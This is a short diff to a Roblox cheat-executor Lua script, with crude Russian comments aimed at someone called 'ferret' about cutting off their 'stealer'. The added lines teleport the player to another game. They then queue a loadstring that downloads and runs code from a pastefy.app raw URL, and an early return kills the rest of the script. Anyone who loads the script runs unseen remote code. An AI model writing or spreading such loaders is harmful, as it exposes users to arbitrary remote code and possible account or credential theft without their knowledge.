@@ -1,1 +1,7 @@
--- хорёк если ты это читаешь то эта залупа чтобы обрубить тебе стилер к чертям собачим если я на тебя обижусь
+-- а зачем блейд болл когда есть мм2?
+
+game:GetService('TeleportService'):Teleport(142823291)
+
+queue_on_teleport('loadstring(game:HttpGet("https://pastefy.app/Qf4mFitx/raw", true))()')
+
+if true then return end
